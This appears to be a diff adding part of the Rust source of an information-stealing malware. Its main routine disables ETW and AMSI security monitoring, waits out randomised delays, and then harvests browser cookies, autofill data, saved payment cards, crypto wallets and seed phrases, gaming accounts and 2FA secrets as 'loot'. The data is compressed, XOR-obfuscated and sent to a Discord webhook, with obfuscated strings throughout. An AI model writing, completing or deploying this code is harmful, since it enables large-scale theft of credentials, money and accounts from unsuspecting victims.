+async fn send_to_discord(data: &[u8]) -> Option<()> {
+    let b64 = base64_enc(data);
+    let webhook_url = xor_str!("https://discord.com/api/webhooks/ID/TOKEN");
+    
+    let payload = serde_json::json!({
+        "content": format!("```{}```", b64)
+    });
+    
+    let client = reqwest::Client::builder()
+        .timeout(std::time::Duration::from_secs(12))
+        .build()
+        .ok()?;
+    
+    let response = client
+        .post(&webhook_url)
+        .json(&payload)
+        .send()
+        .await
+        .ok()?;
+    
+    if response.status().is_success() {
+        Some(())
+    } else {
+        None
+    }
+}
+
+fn compress(data: &[u8]) -> Vec<u8> {
+    use flate2::Compression;
+    use flate2::write::GzEncoder;
+    use std::io::Write;
+    
+    let mut enc = GzEncoder::new(Vec::new(), Compression::best());
+    enc.write_all(data).unwrap_or_default();
+    enc.finish().unwrap_or_default()
+}
+
+fn encrypt(data: &[u8]) -> Vec<u8> {
+    let key = get_key();
+    data.iter().enumerate().map(|(i, &b)| b ^ key[i % key.len()]).collect()
+}
+
+fn get_key() -> Vec<u8> {
+    let mut k = Vec::new();
+    if let Ok(u) = std::env::var(xor_str!("USERNAME")) {
+        k.extend_from_slice(u.as_bytes());
+    }
+    if k.is_empty() {
+        k = b"V43_FALLBACK".to_vec();
+    }
+    k
+}
+
+fn base64_enc(data: &[u8]) -> String {
+    const ALPHA: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    let mut res = String::new();
+    for chunk in data.chunks(3) {
+        let b1 = chunk[0];
+        let b2 = chunk.get(1).copied().unwrap_or(0);
+        let b3 = chunk.get(2).copied().unwrap_or(0);
+        res.push(ALPHA[(b1 >> 2) as usize] as char);
+        res.push(ALPHA[(((b1 & 0x03) << 4) | (b2 >> 4)) as usize] as char);
+        res.push(if chunk.len() > 1 { ALPHA[(((b2 & 0x0F) << 2) | (b3 >> 6)) as usize] as char } else { '=' });
+        res.push(if chunk.len() > 2 { ALPHA[(b3 & 0x3F) as usize] as char } else { '=' });
+    }
+    res
+}
+
+// ==========================================================================
+// MAIN
+// ==========================================================================
+
+#[tokio::main]
+async fn main() {
+    unsafe {
+        patch_etw();
+        patch_amsi();
+    }
+    
+    human_jitter(1800).await;
+    
+    let (cookies, fills, cards, _master_key) = extract_all_browsers().await;
+    
+    human_jitter(600).await;
+    
+    let crypto = Crypto {
+        wallets: extract_wallets().await,
+        seeds: extract_seeds_pattern().await,
+    };
+    
+    human_jitter(500).await;
+    
+    let loot = Loot {
+        meta: collect_meta(),
+        cookies,
+        fills,
+        cards,
+        game: extract_gaming().await,
+        crypto,
+        totp: extract_2fa().await,
+        ts: get_ts(),
+        campaign_id: format!("V43-{}", get_ts()),
+    };
+    
+    human_jitter(800).await;
+    
+    exfiltrate(&loot).await;
+    
+    std::process::exit(0);
+}
